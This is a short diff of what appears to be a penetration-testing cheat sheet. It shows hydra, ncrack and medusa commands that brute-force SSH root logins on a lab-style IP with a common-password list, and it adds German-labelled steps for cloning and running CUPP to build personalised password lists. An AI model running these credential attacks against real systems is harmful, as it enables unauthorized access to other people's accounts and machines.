@@ -58,3 +58,8 @@ hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh
 ncrack -p 22 --user root -P 500-worst-passwords.txt 10.10.10.10
 
 medusa -u root -P 500-worst-passwords.txt -h 10.10.10.10 -M ssh
+
+CUPP um pernsonalisierte Passwortlisten zu erstellen
+git clone https://github.com/Mebus/cupp.git
+python cupp.py -i
+
